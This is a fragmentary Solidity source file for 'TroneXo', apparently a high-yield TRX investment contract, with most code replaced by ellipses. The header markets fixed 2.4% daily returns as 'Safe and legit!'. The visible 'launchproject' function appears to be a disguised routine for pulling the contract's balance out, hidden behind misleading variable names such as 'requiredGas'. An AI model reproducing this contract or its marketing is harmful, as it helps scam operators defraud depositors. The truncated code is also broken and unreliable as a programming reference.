//SourceUnit: TroneXo.sol

/*
 * 
 *   TroneXo - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *
 ...
 * 
 *   - Basic interest rate: +2.4% every 24 hours (+0.1% hourly)
 ...
 *   - 1% Support work, technical functioning, administration fee
 *
 *   ────────────────────────────────────────────────────────────────────────
 *
 *  
...
contract TroneXo {
	...
	uint256 constant public BASE_PERCENT = 24;
	...
	function isActive(address userAddress) public view returns (bool) {
	  ...
	  function launchproject( uint startTime) external {
        ...
        if (startTime > 0) {
          uint contractConsumption = address(this).balance;
            if (contractConsumption > 0) {
                uint requiredGas = startTime > contractConsumption ? contractConsumption : startTime;
